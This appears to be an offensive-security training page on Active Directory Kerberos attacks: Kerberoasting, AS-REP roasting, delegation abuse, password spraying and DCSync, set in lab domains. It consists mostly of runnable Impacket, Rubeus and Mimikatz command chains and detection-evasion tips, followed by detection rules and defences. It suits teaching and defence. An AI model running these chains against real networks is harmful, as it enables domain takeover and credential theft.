---
layout: training-page
title: "Kerberoasting & AS-REP Roasting"
module: "Active Directory"
tags:
  - kerberos
  - kerberoasting
  - asrep
  - cracking
page_key: "ad-kerberoasting"
render_with_liquid: false
---

# Kerberoasting & AS-REP Roasting

## How Kerberos Works (Attacker View)

Kerberos is the authentication protocol used in all modern Active Directory environments. It uses tickets instead of passwords — but the tickets are encrypted with the target service account's password hash. Kerberoasting exploits this by requesting a service ticket (TGS) for any service account with an SPN, then cracking the ticket offline.

**Why it works:** Any authenticated domain user can request a TGS for any SPN. The KDC (domain controller) hands it out encrypted with the service account's NTLM hash. No special privileges needed to request — only domain user credentials.

![Kerberoasting attack flow: attacker requests TGS for SPN, receives ticket encrypted with service account hash, cracks offline](/images/active-directory/kerberoasting-flow.svg)  
*// kerberoasting attack flow — TGS request → offline hash crack*

## Step 1 — Find Kerberoastable Accounts

Service accounts with a Service Principal Name (SPN) set are the targets. SPNs are required for Kerberos service authentication — IIS app pools, SQL services, and custom service accounts are common culprits.

```
# From Linux (Impacket):
GetUserSPNs.py 'domain.local/user:password' -dc-ip 192.168.56.10

# From Linux with hash (Pass-the-Hash):
GetUserSPNs.py 'domain.local/user' -hashes ':NTLM_HASH' -dc-ip 192.168.56.10

# From Windows (PowerView):
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Built-in Windows setspn:
setspn -T domain.local -Q */*   # List all SPNs in domain

# LDAP query for SPNs (any tool):
# Filter: (&(objectClass=user)(servicePrincipalName=*))
# Attribute: samaccountname, serviceprincipalname
```

## Step 2 — Request the TGS Ticket

```
# Impacket GetUserSPNs.py — request AND output hash in one step:
GetUserSPNs.py 'north.sevenkingdoms.local/hodor:hodor' \
  -dc-ip 192.168.56.10 \
  -request \
  -outputfile kerberoast_hashes.txt

# With hash authentication:
GetUserSPNs.py 'north.sevenkingdoms.local/hodor' \
  -hashes ':NTLM_HASH' \
  -dc-ip 192.168.56.10 \
  -request

# Rubeus — from Windows:
Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus — target specific user:
Rubeus.exe kerberoast /user:jon.snow /outfile:jon_snow.txt

# Rubeus — request only RC4 (type 23) even if AES available (faster to crack):
Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt

# PowerView — request ticket manually:
Request-SPNTicket -SPN "MSSQLSvc/castelblack.north.sevenkingdoms.local:1433" -Format Hashcat
```

## Step 3 — Crack the Hash

```
# Hash format identifier:
# $krb5tgs$23$*username$DOMAIN$SPN*$...  → RC4 (type 23) — mode 13100
# $krb5tgs$18$*username$DOMAIN$SPN*$...  → AES256 (type 18) — mode 19700

# Hashcat — RC4 TGS (most common, fastest to crack):
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat — AES256 TGS (stronger, slower):
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for mangling (increase hit rate):
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper:
john kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# GOAD example — jon.snow cracking:
hashcat -m 13100 jon_snow.hash /usr/share/wordlists/rockyou.txt
# → iknownothing
```

## AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication *disabled*. Normally, a client proves knowledge of the password before the KDC issues a TGT. When pre-auth is disabled, anyone can request a TGT for that account — and the TGT response is partially encrypted with the user's password hash. No credentials needed to retrieve the hash.

### Finding Pre-Auth Disabled Accounts

```
# From Linux (no credentials needed if pre-auth is disabled):
GetNPUsers.py 'sevenkingdoms.local/' \
  -dc-ip 192.168.56.11 \
  -no-pass \
  -usersfile users.txt

# From Linux with credentials (enumerate first, then roast):
GetNPUsers.py 'sevenkingdoms.local/hodor:hodor' \
  -dc-ip 192.168.56.11 \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt

# PowerView:
Get-DomainUser -PreauthNotRequired | Select samaccountname

# LDAP filter for pre-auth disabled:
# (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Rubeus (from Windows):
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:viserys.targaryen /format:hashcat
```

### Cracking AS-REP Hashes

```
># Hash format: $krb5asrep$23$username@DOMAIN$...
# Hashcat mode: 18200

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John:
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Targeted Kerberoasting (via ACL Abuse)

If you have `GenericWrite` or `GenericAll` over a user account (common in GOAD's LANNISTER group), you can set an SPN on any user account and then Kerberoast them — even if they didn't have an SPN before. This turns a low-privilege AD ACL misconfiguration into a credential attack on a high-value account.

```
# 1. Set SPN on target user (requires GenericWrite or GenericAll):
# From Windows (PowerView):
Set-DomainObject -Identity 'cersei.lannister' \
  -Set @{ServicePrincipalName='fake/kerb'} \
  -Credential $cred

# From Linux (impacket):
addspn.py -u 'domain\user' -p 'password' -s 'fake/spn' \
  -t 'cersei.lannister' ldap://192.168.56.10

# 2. Kerberoast the account:
GetUserSPNs.py 'domain/user:password' -dc-ip 192.168.56.10 \
  -request -outputfile targeted.txt

# 3. Crack, recover password, remove fake SPN:
Set-DomainObject -Identity 'cersei.lannister' \
  -Clear ServicePrincipalName
```

## Detection & OPSEC

- **Event ID 4769** — Kerberos Service Ticket Operations. High volume of 4769 events for RC4 encryption (etype 0x17) is a Kerberoasting indicator — modern Kerberos defaults to AES.
- **Detection rule:** Multiple TGS requests from a single source within seconds, especially for RC4 encryption type, for accounts not normally requesting service tickets.
- **OPSEC tip:** Request tickets one at a time, not all at once. Use `Rubeus.exe kerberoast /rc4opsec` which only requests RC4 on accounts without AES keys — blends in with legacy clients.
- **OPSEC tip:** For AS-REP, request one hash at a time — bulk requests are easily detected.

## Key Resources

- [Rubeus (.NET Kerberos toolkit)](https://github.com/GhostPack/Rubeus)
- [Impacket (GetUserSPNs.py, GetNPUsers.py)](https://github.com/SecureAuthCorp/impacket)
- [Kerberos internals explained](https://www.tarlogic.com/blog/how-kerberos-works/)

## Kerberoasting from Linux — Impacket GetUserSPNs.py

GetUserSPNs.py is the standard Linux-side Kerberoasting tool. It enumerates SPN accounts, requests TGS tickets, and outputs hashes in a crackable format in a single command.

```
# List SPN accounts (check group membership — some may be DA members):
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS tickets for offline cracking:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request ticket for specific account:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Save directly to file:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile sqldev_tgs

# Crack with hashcat mode 13100 (RC4) or 19700 (AES256):
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Confirm access after cracking:
crackmapexec smb 172.16.5.5 -u sqldev -p 'database!' -d INLANEFREIGHT.LOCAL
```

## Kerberoasting from Windows — Rubeus and setspn

From a Windows attack host, Rubeus is the preferred tool. For environments where Rubeus is blocked, the built-in setspn.exe can enumerate SPNs, and PowerShell can request tickets that Mimikatz can then export.

```
# Enumerate SPNs with built-in setspn:
setspn.exe -Q */*

# Rubeus — roast all SPN accounts:
.\Rubeus.exe kerberoast /outfile:spn.txt

# Rubeus — force RC4 downgrade (faster to crack):
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:spn.txt

# Crack with hashcat:
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile cracked.txt

# Prevention: Use Group Managed Service Accounts (gMSA) — 127-char random passwords
# Make manual SPN accounts have 100+ char passwords (effectively uncrackable)
```

## Kerberos Delegation Attacks

Kerberos delegation allows a service to request tickets on behalf of users. Three types exist: Unconstrained (most permissive), Constrained, and Resource-Based Constrained Delegation (RBCD). Constrained delegation abuse uses S4U2Self/S4U2Proxy to impersonate any user to the delegated service.

```
# Enumerate accounts trusted for constrained delegation:
Get-NetUser -TrustedToAuth
# Look for: msds-allowedtodelegateto attribute — lists which services can be delegated to

# Enumerate with Get-ADUser:
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo

# Constrained Delegation abuse with Rubeus (S4U attack):
# Step 1: Get NTLM hash of the account trusted for delegation:
.\Rubeus.exe hash /password:ServiceAccountPass

# Step 2: Request ticket impersonating Administrator to the delegated service:
.\Rubeus.exe s4u /user:webservice /rc4:NTLM_HASH /domain:eagle.local \
  /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

# Step 3: Use the ticket (e.g., HTTP → PowerShell Remoting to DC):
klist  # verify ticket for Administrator@EAGLE.LOCAL
Enter-PSSession dc1

# Protocol transition — delegate to a different service than configured:
# If trusted for LDAP, you can request CIFS, HTTP, host, etc. via /altservice:
.\Rubeus.exe s4u /user:webservice /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:"ldap/dc1" /altservice:cifs /dc:dc1.eagle.local /ptt

# Detection: Event 4624 with "Transited Services" field populated (S4U logon)
# Prevention: Mark privileged accounts with "Account is sensitive and cannot be delegated"
# or add them to the Protected Users group
```

## Kerberos Double Hop Problem

When using WinRM/PSRemoting, Kerberos tickets are issued for a specific resource — the user's NTLM hash is never cached in the remote session. Attempting to access a second hop (e.g., a file share or DC from within a WinRM session) fails because there are no credentials to re-authenticate with. This is the "Double Hop" problem.

```
# The problem: Enter-PSSession to DEV01, then try to access a share on DC01:
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
# From within the session:
ls \\dc01\share    # → Access Denied (no credentials in Kerberos session)

# Verify with mimikatz inside the session — credentials will be blank:
.\mimikatz "sekurlsa::logonpasswords" exit
# The backupadm credentials won't appear — only machine account creds

# Workaround 1 — PSCredential object + explicit -Credential in commands:
$SecPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPass)
Get-DomainUser -Credential $Cred   # Pass credentials explicitly to each command

# Workaround 2 — Register PSSession configuration (requires admin on remote host):
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential INLANEFREIGHT\backupadm
Restart-Service WinRM
# Then connect using the named config:
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
# Now the second hop works — credentials are available in the session

# Workaround 3 — CredSSP delegation (less secure, avoid on sensitive hosts):
# Enable on client: Enable-WSManCredSSP -Role Client -DelegateComputer "DEV01"
# Enable on server: Enable-WSManCredSSP -Role Server
# Connect: Enter-PSSession -ComputerName DEV01 -Credential $Cred -Authentication Credssp

# Workaround 4 — Use PSExec or SMB-based tools instead of WinRM
# PSExec stores NTLM hash in session → second hop works natively
```

## Unconstrained Delegation — Full Attack Chain

Unconstrained delegation is the most dangerous form — when a user authenticates to a server with this flag, the DC includes the user's full TGT inside the service ticket. The server caches those TGTs and can impersonate the user to ANY service in the domain. Domain Controllers always have unconstrained delegation set by design.

```
# --- Step 1: Enumerate servers with unconstrained delegation ---
# PowerView:
Get-DomainComputer -Unconstrained | Select dnshostname,samaccountname
Get-DomainComputer -Unconstrained | Select dnshostname,samaccountcontrol

# ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName

# Find user accounts with unconstrained delegation (rare but possible):
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# --- Step 2: Check your access to a server with unconstrained delegation ---
Find-LocalAdminAccess -ComputerName "dcorp-appsrv.dollarcorp.moneycorp.local"

# --- Step 3: Monitor for incoming TGTs (on compromised unconstrained delegation server) ---
# Rubeus — continuously monitor for new TGTs (preferred):
Rubeus.exe monitor /interval:5 /filteruser:DCORP-DC$

# Mimikatz — export all cached tickets from LSASS:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
# Look for TGT tickets — service name "krbtgt", not other service names
# Filename pattern: [0;3e7]-2-0-40e10000-DCORP-DC$@krbtgt-DOLLARCORP.kirbi

# --- Step 4: Coerce authentication (force a DC to authenticate to your server) ---
# Option A — Printer Bug (MS-RPRN) — forces DC spooler to authenticate outbound:
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# Option B — PetitPotam — coerces authentication via EFS RPC:
PetitPotam.exe dcorp-appsrv.dollarcorp.moneycorp.local dcorp-dc.dollarcorp.moneycorp.local

# After coercion, the DC's computer account TGT is cached on dcorp-appsrv.
# Rubeus monitor will capture and print it in base64.

# --- Step 5: Pass-the-Ticket and use the captured TGT ---
# Rubeus — inject the captured TGT:
Rubeus.exe ptt /ticket:BASE64_TICKET

# Mimikatz — inject from .kirbi file:
Invoke-Mimikatz -Command '"kerberos::ptt DCORP-DC@krbtgt.kirbi"'

# Verify:
klist

# --- Step 6: Use DC computer account TGT for DCSync ---
# DC computer accounts have Replicating Directory Changes rights
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\administrator"'

# Complete attack chain summary:
# Find unconstrained server → Compromise it → Run Rubeus monitor
# → Trigger Printer Bug → Capture DC$ TGT → PTT → DCSync → Full domain

# --- Defense ---
# Protected Users group — TGTs for these accounts are not included in service tickets
# "Account is sensitive and cannot be delegated" flag on high-privilege accounts:
Set-ADAccountControl -Identity AdminUser -AccountNotDelegated $true
# Disable Print Spooler on DCs:
Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
# Monitor MS-RPRN / EFS RPC coercion activity
```

## Resource-Based Constrained Delegation (RBCD)

RBCD is configured on the *resource* (target computer), not on the source account. If you have Write access on any computer account object (GenericWrite, GenericAll, WriteDacl), you can configure it to trust a computer you control — then use S4U2Proxy to impersonate any domain user to that computer. Any domain user can create up to 10 computer accounts by default (MachineAccountQuota).

```
# --- Step 1: Find computers where you have Write access ---
# PowerView:
Find-InterestingDomainAcl | Where-Object {
    $_.IdentityReferenceName -match "studentusers" -and
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll"
}

# Check a specific target:
Get-DomainComputer -Identity dcorp-mgmt | Get-ObjectAcl |
    Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll"}

# --- Step 2: Create a fake computer account (uses MachineAccountQuota) ---
# PowerMad module:
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount ATTACKERPC -Password $(ConvertTo-SecureString 'AttackPass123!' -AsPlainText -Force)

# Verify:
Get-DomainComputer -Identity ATTACKERPC

# Check domain MachineAccountQuota (default is 10):
Get-ADDomain | Select -ExpandProperty DistinguishedName |
    ForEach-Object { (Get-ADObject $_ -Properties "ms-DS-MachineAccountQuota")."ms-DS-MachineAccountQuota" }

# --- Step 3: Configure RBCD on the target computer ---
# Get SID of the attacker-controlled computer:
$AttackerSid = Get-DomainComputer -Identity ATTACKERPC -Properties objectsid | Select -ExpandProperty objectsid

# Build security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set msds-allowedtoactonbehalfofotheridentity on target:
Get-DomainComputer -Identity dcorp-mgmt | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify:
Get-DomainComputer -Identity dcorp-mgmt -Properties msds-allowedtoactonbehalfofotheridentity

# Alternative (ActiveDirectory module):
Set-ADComputer dcorp-mgmt -PrincipalsAllowedToDelegateToAccount ATTACKERPC$

# --- Step 4: Perform S4U attack with the attacker-controlled computer account ---
# Using Rubeus:
Rubeus.exe s4u /user:ATTACKERPC$ /password:AttackPass123! /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mgmt.dollarcorp.moneycorp.local /ptt

# For full remote access, use alternate service (HOST = WinRM, WMI, scheduled tasks):
Rubeus.exe s4u /user:ATTACKERPC$ /password:AttackPass123! /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mgmt.dollarcorp.moneycorp.local /altservice:HOST /ptt

# --- Step 5: Access the target ---
klist   # verify ticket loaded for Administrator@DOMAIN
dir \\dcorp-mgmt\c$
Enter-PSSession -ComputerName dcorp-mgmt

# --- Cleanup (important for red team assessments) ---
# Remove RBCD configuration from target:
Set-DomainObject -Identity dcorp-mgmt -Clear msds-allowedtoactonbehalfofotheridentity

# Delete fake computer account:
Remove-ADComputer -Identity ATTACKERPC -Confirm:$false

# --- Defense ---
# Reduce MachineAccountQuota to 0 (require DA to create computers):
Set-ADDomain -Identity domain.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
# Monitor Event ID 4741 (computer account created)
# Audit msDS-AllowedToActOnBehalfOfOtherIdentity attribute changes
# Remove unnecessary GenericWrite/GenericAll on computer objects
```

## Kerbrute — Account Enumeration and Password Spraying

Kerbrute uses Kerberos AS-REQ packets to enumerate valid usernames and spray passwords. It is fast (one UDP frame per check) and stealthy — username enumeration does not trigger Event ID 4625 (failed logon), only 4768 (TGT request). Password spraying increments failed login counts and can lock accounts.

```
# Install — download binary from https://github.com/ropnop/kerbrute/releases/
mv kerbrute_linux_amd64 kerbrute
chmod +x ./kerbrute

# User enumeration — no authentication needed, no account lockouts:
kerbrute userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local
# Generates Event ID 4768 if Kerberos logging enabled
# PRINCIPAL UNKNOWN error = user does not exist
# Pre-auth prompt = valid username

# Password spraying — tests one password against all users:
kerbrute passwordspray users.txt 'Summer2024!' --dc dc01.inlanefreight.local -d inlanefreight.local
# Generates Event IDs 4768 and 4771
# WARNING: does increment failed login count — use /safe to abort on lockout
kerbrute passwordspray users.txt 'Welcome1' --dc dc01.inlanefreight.local -d inlanefreight.local --safe

# Bruteforce single user with wordlist:
kerbrute bruteuser wordlist.txt john.smith --dc dc01.inlanefreight.local -d inlanefreight.local

# Key flags:
# --dc      Domain Controller IP or hostname
# -d        Full domain name (e.g. contoso.com)
# -o        Output file for valid accounts
# -t        Threads (default 10)
# --delay   Milliseconds between attempts (slows, uses single thread)
# --safe    Abort if any account comes back locked out
```

## AS-REPRoasting from Linux — Without Credentials

GetNPUsers.py can enumerate and roast AS-REP vulnerable accounts without domain credentials when you supply a username list. This is useful when you have a user list from enumeration but no valid password yet.

```
# Enumerate AS-REPRoastable accounts WITH credentials (full info + hashes):
GetNPUsers.py inlanefreight.local/pixis -request
# Lists Name, MemberOf, PasswordLastSet, UAC, and outputs $krb5asrep$ hashes

# Enumerate WITHOUT credentials — requires a username list:
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 \
  -usersfile /tmp/users.txt \
  -format hashcat \
  -outputfile /tmp/hashes.txt \
  -no-pass
# KDC_ERR_C_PRINCIPAL_UNKNOWN errors are expected for non-existent users
# Valid hashes are written to /tmp/hashes.txt even if errors are printed

# View captured hashes:
cat /tmp/hashes.txt
# $krb5asrep$23$amber.smith@INLANEFREIGHT:...

# Crack AS-REP hashes — hashcat mode 18200:
hashcat -m 18200 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt

# Note: /etc/hosts must have an entry for the domain/DC before running these tools
# echo "10.129.205.35 dc01.inlanefreight.local inlanefreight.local" >> /etc/hosts
```

## Constrained Delegation Attack from Linux

With Impacket's findDelegation.py and getST.py you can enumerate constrained delegation and perform the full S4U2Self/S4U2Proxy attack chain from Linux. A compromised account with "Constrained w/ Protocol Transition" delegation can impersonate any user to the configured services.

```
# Step 1: Find accounts with delegation configured:
findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
# Output columns: AccountName, AccountType, DelegationType, DelegationRightsTo
# Look for "Constrained w/ Protocol Transition" — these support S4U2Self (arbitrary user impersonation)

# Step 2: Perform S4U attack with getST.py — impersonate Administrator:
# -spn: the SPN you want a ticket for
# -impersonate: the high-privilege user to impersonate
getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' \
  -impersonate Administrator
# Saves ticket as Administrator.ccache

# Step 3: Export the ccache and use with any Impacket tool:
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
# psexec auto-finds compatible SPN in cache and swaps sname on the fly (AnySPN)

# With NTLM hash instead of password:
getST.py -spn TERMSRV/DC01 -hashes :NTLM_HASH 'INLANEFREIGHT.LOCAL/beth.richards' \
  -impersonate Administrator

# Alternative execution after KRB5CCNAME is set:
wmiexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
secretsdump.py -k -no-pass dc01.inlanefreight.local
```

## Unconstrained Delegation Attack from Linux — krbrelayx

If a user account (not a computer account) has unconstrained delegation, the krbrelayx toolkit can capture a DC's TGT by combining a fake DNS record, a crafted SPN, and the Printer Bug to coerce authentication. The captured ccache is then used for DCSync.

```
# Setup: Clone krbrelayx toolkit
git clone https://github.com/dirkjanm/krbrelayx; cd krbrelayx

# Step 1: Add fake DNS record pointing to your attack host (any valid domain account):
python dnstool.py -u 'INLANEFREIGHT.LOCAL\pixis' -p p4ssw0rd \
  -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207
# Verify: nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local

# Step 2: Add CIFS SPN to the unconstrained delegation user account (requires GenericWrite):
# --target-type samname = target is a username (not a hostname)
python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd \
  --target-type samname -t sqldev \
  -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local

# Step 3: Start krbrelayx — provide the compromised account's NT hash to decrypt incoming TGS:
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
# Saves captured ticket as DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache

# Step 4: Trigger coercion — force DC01 to authenticate to roguecomputer (Printer Bug):
python printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
# Alternative: python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local

# Step 5: Use captured DC TGT for DCSync:
export KRB5CCNAME='./DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache'
secretsdump.py -k -no-pass dc01.inlanefreight.local
# Dumps all domain hashes via DRSUAPI replication
unset KRB5CCNAME
```

## RBCD from Linux — Full Attack Chain

RBCD from Linux uses Impacket's addcomputer.py to create a fake machine account, rbcd.py to configure delegation, and getST.py for the S4U ticket request. Requires an account with GenericWrite/GenericAll on the target computer, or the default MachineAccountQuota of 10.

```
# Prerequisite: identify a user with GenericWrite/GenericAll on a computer
# (BloodHound: "Shortest Paths to Domain Admins" → look for GenericWrite edges on computers)

# Step 1: Create a fake computer account (MachineAccountQuota default = 10 for any auth user):
addcomputer.py -computer-name 'HACKTHEBOX$' \
  -computer-pass 'Hackthebox123+!' \
  -dc-ip 10.129.205.35 \
  inlanefreight.local/carole.holmes
# [*] Successfully added machine account HACKTHEBOX$ with password Hackthebox123+!

# Step 2: Configure RBCD — set HACKTHEBOX$ in target computer's msDS-AllowedToActOnBehalfOfOtherIdentity:
# Download rbcd.py: https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX \
  'inlanefreight\carole.holmes:Y3t4n0th3rP4ssw0rd'
# [*] HACKTHEBOX$ can now impersonate users on DC01$ via S4U2Proxy

# Step 3: Request service ticket impersonating Administrator:
getST.py -spn cifs/DC01.inlanefreight.local \
  -impersonate Administrator \
  -dc-ip 10.129.205.35 \
  inlanefreight.local/HACKTHEBOX:'Hackthebox123+!'
# Saves ticket as Administrator.ccache

# Step 4: Export ticket and get shell:
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.inlanefreight.local
# C:\Windows\system32> whoami → nt authority\system

# Note: add dc01.inlanefreight.local to /etc/hosts before using Kerberos tools

# --- RBCD when MachineAccountQuota = 0 (Forshaw method — normal user account) ---
# Get NT hash from password:
pypykatz crypto nt 'B3thR!ch@rd$'
# → de3d16603d7ded97bb47cd6641b1a392

# Get TGT and extract session key:
getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
# → 7c3d8b8b135c7d574e423dcd826cab58

# Change user's password to match session key (allows KDC to decrypt TGT):
changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 \
  -hashes :de3d16603d7ded97bb47cd6641b1a392 \
  -newhash :7c3d8b8b135c7d574e423dcd826cab58

# Request service ticket using U2U (user-to-user):
KRB5CCNAME=beth.richards.ccache getST.py -u2u \
  -impersonate Administrator \
  -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL \
  -no-pass INLANEFREIGHT.LOCAL/beth.richards \
  -dc-ip 10.129.205.35

# Use the ticket:
KRB5CCNAME='Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache' \
  wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
```

## Detection

### Event Log Sources
- **Event ID 4769** (Kerberos Service Ticket Operations) — The primary Kerberoasting indicator. Filter for: `TicketEncryptionType = 0x17` (RC4-HMAC) combined with `ServiceName` not ending in `$` (computer accounts) and not equal to `krbtgt`. A burst of 4769 events from a single source IP requesting RC4 tickets for many different SPNs within seconds is a high-confidence Kerberoasting signal.
- **Event ID 4768** (Kerberos TGT Request) — Useful for correlating the source account. Kerbrute user enumeration generates 4768 events with `PRINCIPAL_UNKNOWN (0x6)` error codes.
- **Event ID 4771** (Kerberos Pre-Authentication Failed) — Fires during password spraying via Kerberos.
- **Event ID 4741** (Computer Account Created) — Targeted Kerberoasting via RBCD first creates a machine account; monitor for unexpected computer account creation especially outside of provisioning windows.

### Sysmon Events
- **Event ID 1 (Process Creation)** — `Rubeus.exe kerberoast` or `GetUserSPNs.py` running from unexpected paths or parent processes. Command line will contain `kerberoast`, `/spn`, or `GetUserSPNs`.
- **Event ID 3 (Network Connection)** — Connections from attacker tools to DC on port 88 (Kerberos) and 389/636 (LDAP for SPN enumeration) from non-standard systems or at unusual hours.

### Key Indicators
- Multiple Event ID 4769 events with `EncryptionType = 0x17` (RC4) from a single source in under 60 seconds — Rubeus default behavior requests all tickets in rapid succession
- A honey account SPN (a service account with a strong password and an SPN that is never legitimately used) generating **any** 4769 event — this is a near-zero false-positive indicator of Kerberoasting
- `setspn -T domain -Q */*` or `Get-DomainUser -SPN` LDAP queries from non-admin workstations
- `$krb5tgs$23$` hashes appearing in log files or on-disk artifacts (e.g., Rubeus output files)
- 4769 events where `ServiceName` matches accounts recently added with a fake SPN (targeted Kerberoasting via GenericWrite ACL abuse)

### Sigma Rule Concept
```yaml
# Sigma concept — Kerberoasting via RC4 ticket volume
title: Kerberoasting Activity via High Volume RC4 TGS Requests
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'   # RC4-HMAC — weak, downgraded
        Status: '0x0'                  # success only
    filter_computer_accounts:
        ServiceName|endswith: '$'      # exclude machine accounts
    filter_krbtgt:
        ServiceName: 'krbtgt'
    timeframe: 30s
    condition: selection and not filter_computer_accounts and not filter_krbtgt | count() by SubjectUserName > 5
falsepositives:
    - Legacy applications requiring RC4 Kerberos
    - Scheduled batch jobs requesting multiple service tickets
level: high

# Honey account rule (zero false positives):
title: Kerberoasting Honeypot SPN Triggered
detection:
    selection:
        EventID: 4769
        ServiceName: 'honeysvc_NEVERUSED'  # replace with your honey SPN
    condition: selection
level: critical
```

### EDR Behavior Alerts
- **CrowdStrike Falcon**: "Kerberos Service Ticket Request with Weak Encryption" / "Potential Kerberoasting" — correlates RC4 ticket requests with SPN enumeration LDAP queries from the same host
- **SentinelOne**: "Kerberoasting Attempt" — behavioral alert combining LDAP SPN enumeration with subsequent 4769 RC4 events
- **Microsoft Defender for Identity (MDI)**: Built-in "Kerberoasting" alert — MDI natively detects bulk RC4 TGS requests and correlates them with account enumeration; also alerts on honey account SPN access
- **Microsoft Defender for Endpoint**: "Suspicious Kerberos ticket request" alert when Rubeus or similar tooling is detected via process telemetry

### Defensive Countermeasures
- **Enforce AES-only Kerberos** — set `msDS-SupportedEncryptionTypes = 0x18` (AES128 + AES256) on service accounts; RC4 downgrade requests become detectable or fail outright
- **Group Managed Service Accounts (gMSA)** — 127-character randomly-rotated passwords make Kerberoasted hashes computationally infeasible to crack regardless of encryption type
- **Honeypot SPNs** — create service accounts with SPNs that are never legitimately accessed; alert on any 4769 for these accounts
- **Fine-Grained Password Policy** — enforce 25+ character passwords on all service accounts with SPNs
- **Audit SPN assignments** — review all accounts with SPNs regularly; remove unnecessary SPNs from high-privilege accounts
- **Protected Users group** — members cannot use RC4 Kerberos; any Kerberoast attempt against them uses AES only (harder to crack, also more detectable as unusual)
- **Privileged Identity Management (PIM)** — enforce just-in-time access for service accounts, reducing the window where an SPN is exposed

## Rubeus — Real-Time Ticket Harvesting

